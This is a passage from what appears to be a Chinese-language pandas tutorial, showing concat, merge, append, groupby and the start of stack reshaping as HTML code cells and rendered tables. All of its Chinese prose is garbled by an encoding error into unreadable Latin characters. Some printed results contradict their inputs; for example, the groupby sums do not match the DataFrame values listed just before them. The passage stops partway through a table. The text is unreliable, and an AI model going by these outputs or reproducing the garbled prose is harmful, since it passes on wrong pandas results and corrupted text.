class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'Aaba'</span><span class="token punctuation">,</span> <span class="token string">'Baca'</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span> <span class="token string">'CABA'</span><span class="token punctuation">,</span> <span class="token string">'dog'</span><span class="token punctuation">,</span> <span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>0       a1       b2       c3    aaba4    baca5     NaN6    caba7     dog8     catdtype: object</code></pre><h2 id="0x08-åˆå¹¶-Merge"><a href="#0x08-åˆå¹¶-Merge" class="headerlink" title="0x08 åˆå¹¶ Merge"></a>0x08 åˆå¹¶ Merge</h2><p>pandas æä¾›äº†ä¸€ç³»åˆ—çš„æ–¹æ³•ï¼Œåœ¨ join/merge æ“ä½œä¸­ï¼Œå¯ä»¥è½»æ¾åœ°å¯¹<code>Series</code>, <code>DataFrame</code>å’Œ<code>Panel</code>å¯¹è±¡è¿›è¡Œå„ç§é›†åˆé€»è¾‘ä»¥åŠå…³ç³»ä»£æ•°çš„æ“ä½œã€‚</p><h3 id="0x08-1-Concat"><a href="#0x08-1-Concat" class="headerlink" title="0x08-1 Concat"></a>0x08-1 Concat</h3><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-0.089143</td>      <td>0.087569</td>      <td>0.218078</td>      <td>-0.336815</td>    </tr>    <tr>      <th>1</th>      <td>-0.694835</td>      <td>0.108324</td>      <td>-1.882762</td>      <td>-0.220210</td>    </tr>    <tr>      <th>2</th>      <td>-2.069784</td>      <td>-0.788424</td>      <td>-1.694595</td>      <td>0.569263</td>    </tr>    <tr>      <th>3</th>      <td>2.433036</td>      <td>0.719851</td>      <td>-0.109935</td>      <td>0.177864</td>    </tr>    <tr>      <th>4</th>      <td>-0.838252</td>      <td>1.117676</td>      <td>0.880839</td>      <td>-1.118529</td>    </tr>    <tr>      <th>5</th>      <td>1.706060</td>      <td>0.290877</td>      <td>-0.907941</td>      <td>-0.532450</td>    </tr>    <tr>      <th>6</th>      <td>0.118169</td>      <td>-0.496975</td>      <td>-0.190422</td>      <td>0.783875</td>    </tr>    <tr>      <th>7</th>      <td>-1.213645</td>      <td>-0.489622</td>      <td>-0.798443</td>      <td>-0.471611</td>    </tr>    <tr>      <th>8</th>      <td>-0.314598</td>      <td>-2.658906</td>      <td>-1.139778</td>      <td>0.374437</td>    </tr>    <tr>      <th>9</th>      <td>0.229281</td>      <td>-1.372309</td>      <td>0.996916</td>      <td>-1.013462</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># break it into pieces</span>pieces <span class="token operator">=</span> <span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> df<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> df<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pieces</code></pre><pre><code>[          0         1         2         3 0 -0.089143  0.087569  0.218078 -0.336815 1 -0.694835  0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595  0.569263,           0         1         2         3 3  2.433036  0.719851 -0.109935  0.177864 4 -0.838252  1.117676  0.880839 -1.118529 5  1.706060  0.290877 -0.907941 -0.532450 6  0.118169 -0.496975 -0.190422  0.783875,           0         1         2         3 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778  0.374437 9  0.229281 -1.372309  0.996916 -1.013462]</code></pre><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>pieces<span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-0.089143</td>      <td>0.087569</td>      <td>0.218078</td>      <td>-0.336815</td>    </tr>    <tr>      <th>1</th>      <td>-0.694835</td>      <td>0.108324</td>      <td>-1.882762</td>      <td>-0.220210</td>    </tr>    <tr>      <th>2</th>      <td>-2.069784</td>      <td>-0.788424</td>      <td>-1.694595</td>      <td>0.569263</td>    </tr>    <tr>      <th>3</th>      <td>2.433036</td>      <td>0.719851</td>      <td>-0.109935</td>      <td>0.177864</td>    </tr>    <tr>      <th>4</th>      <td>-0.838252</td>      <td>1.117676</td>      <td>0.880839</td>      <td>-1.118529</td>    </tr>    <tr>      <th>5</th>      <td>1.706060</td>      <td>0.290877</td>      <td>-0.907941</td>      <td>-0.532450</td>    </tr>    <tr>      <th>6</th>      <td>0.118169</td>      <td>-0.496975</td>      <td>-0.190422</td>      <td>0.783875</td>    </tr>    <tr>      <th>7</th>      <td>-1.213645</td>      <td>-0.489622</td>      <td>-0.798443</td>      <td>-0.471611</td>    </tr>    <tr>      <th>8</th>      <td>-0.314598</td>      <td>-2.658906</td>      <td>-1.139778</td>      <td>0.374437</td>    </tr>    <tr>      <th>9</th>      <td>0.229281</td>      <td>-1.372309</td>      <td>0.996916</td>      <td>-1.013462</td>    </tr>  </tbody></table></div><h3 id="0x08-2-Join"><a href="#0x08-2-Join" class="headerlink" title="0x08-2 Join"></a>0x08-2 Join</h3><p>ç±»ä¼¼äº SQL ç±»å‹çš„åˆå¹¶ã€‚</p><p>ä¸‹é¢æ˜¯ key ç›¸åŒçš„æƒ…å†µã€‚</p><pre class="language-python" data-language="python"><code class="language-python">left <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'lval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>left</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>2</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">right <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>right</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>5</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>1</td>      <td>5</td>    </tr>    <tr>      <th>2</th>      <td>foo</td>      <td>2</td>      <td>4</td>    </tr>    <tr>      <th>3</th>      <td>foo</td>      <td>2</td>      <td>5</td>    </tr>  </tbody></table></div><p>å¦ä¸€ä¸ªä¾‹å­ï¼Œkey ä¸åŒçš„æƒ…å†µã€‚</p><pre class="language-python" data-language="python"><code class="language-python">left <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'lval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>left</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>2</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">right <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>right</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>5</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>2</td>      <td>5</td>    </tr>  </tbody></table></div><h3 id="0x08-3-Append"><a href="#0x08-3-Append" class="headerlink" title="0x08-3 Append"></a>0x08-3 Append</h3><p>å°†ä¸€è¡ŒåŠ å…¥åˆ°ä¸€ä¸ª DataFrame ä¸Š</p><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>df<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ignore_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># å¿½ç•¥ index</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>    <tr>      <th>8</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>df<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ignore_index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>  </tbody></table></div><h2 id="0x09-åˆ†ç»„-Grouping"><a href="#0x09-åˆ†ç»„-Grouping" class="headerlink" title="0x09 åˆ†ç»„ Grouping"></a>0x09 åˆ†ç»„ Grouping</h2><p>å¯¹äºåˆ†ç»„(group by)ï¼Œé€šå¸¸æœ‰ä¸‹é¢å‡ ä¸ªæ“ä½œæ­¥éª¤ï¼š</p><ul><li><p>Splitting æŒ‰ç…§ä¸€äº›è§„åˆ™å°†æ•°æ®åˆ†ä¸ºä¸åŒçš„ç»„</p></li><li><p>Applying å¯¹äºæ¯ç»„æ•°æ®åˆ†åˆ«æ‰§è¡Œä¸€ä¸ªå‡½æ•°</p></li><li><p>Combining å°†ç»“æœç»„åˆåˆ°ä¸€ä¸ªæ•°æ®ç»“æ„ä¸­</p></li></ul><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span>                         <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                  <span class="token string">'B'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">,</span>                         <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                  <span class="token string">'C'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>one</td>      <td>1.038586</td>      <td>2.040014</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>one</td>      <td>0.454452</td>      <td>-0.553457</td>    </tr>    <tr>      <th>2</th>      <td>foo</td>      <td>two</td>      <td>-0.730273</td>      <td>-0.207136</td>    </tr>    <tr>      <th>3</th>      <td>bar</td>      <td>three</td>      <td>0.435136</td>      <td>0.443462</td>    </tr>    <tr>      <th>4</th>      <td>foo</td>      <td>two</td>      <td>2.557988</td>      <td>-1.831259</td>    </tr>    <tr>      <th>5</th>      <td>bar</td>      <td>two</td>      <td>1.131084</td>      <td>0.915332</td>    </tr>    <tr>      <th>6</th>      <td>foo</td>      <td>one</td>      <td>1.078171</td>      <td>0.037355</td>    </tr>    <tr>      <th>7</th>      <td>foo</td>      <td>three</td>      <td>2.057203</td>      <td>1.209778</td>    </tr>  </tbody></table></div><p>åˆ†ç»„å¹¶å¯¹å¾—åˆ°çš„åˆ†ç»„æ‰§è¡Œ<code>sum</code>å‡½æ•°ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>C</th>      <th>D</th>    </tr>    <tr>      <th>A</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th>bar</th>      <td>-1.001520</td>      <td>1.880284</td>    </tr>    <tr>      <th>foo</th>      <td>1.365107</td>      <td>1.459170</td>    </tr>  </tbody></table></div><p>é€šè¿‡å¤šä¸ªåˆ—è¿›è¡Œåˆ†ç»„å½¢æˆä¸€ä¸ªå±‚æ¬¡(hierarchical)ç´¢å¼•ï¼Œç„¶åæ‰§è¡Œå‡½æ•°ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>C</th>      <th>D</th>    </tr>    <tr>      <th>A</th>      <th>B</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="3" valign="top">bar</th>      <th>one</th>      <td>0.598883</td>      <td>1.667737</td>    </tr>    <tr>      <th>three</th>      <td>-0.605689</td>      <td>-0.531403</td>    </tr>    <tr>      <th>two</th>      <td>-0.994715</td>      <td>0.743951</td>    </tr>    <tr>      <th rowspan="3" valign="top">foo</th>      <th>one</th>      <td>-0.090250</td>      <td>0.694644</td>    </tr>    <tr>      <th>three</th>      <td>0.738067</td>      <td>1.498865</td>    </tr>    <tr>      <th>two</th>      <td>0.717290</td>      <td>-0.734339</td>    </tr>  </tbody></table></div><h2 id="0x0A-é‡å¡‘-æ”¹å˜å½¢çŠ¶-Reshaping"><a href="#0x0A-é‡å¡‘-æ”¹å˜å½¢çŠ¶-Reshaping" class="headerlink" title="0x0A é‡å¡‘/æ”¹å˜å½¢çŠ¶ Reshaping"></a>0x0A é‡å¡‘/æ”¹å˜å½¢çŠ¶ Reshaping</h2><h3 id="0x0A-1-Stack"><a href="#0x0A-1-Stack" class="headerlink" title="0x0A-1 Stack"></a>0x0A-1 Stack</h3><pre class="language-python" data-language="python"><code class="language-python">tuples <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">,</span>                      <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'qux'</span><span class="token punctuation">,</span> <span class="token string">'qux'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                     <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span>                      <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tuples</code></pre><pre><code>[('bar', 'one'), ('bar', 'two'), ('baz', 'one'), ('baz', 'two'), ('foo', 'one'), ('foo', 'two'), ('qux', 'one'), ('qux', 'two')]</code></pre><pre class="language-python" data-language="python"><code class="language-python">index <span class="token operator">=</span> pd<span class="token punctuation">.</span>MultiIndex<span class="token punctuation">.</span>from_tuples<span class="token punctuation">(</span>tuples<span class="token punctuation">,</span> names<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'second'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>index<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>    <tr>      <th rowspan="2" valign="top">foo</th>      <th>one</th>      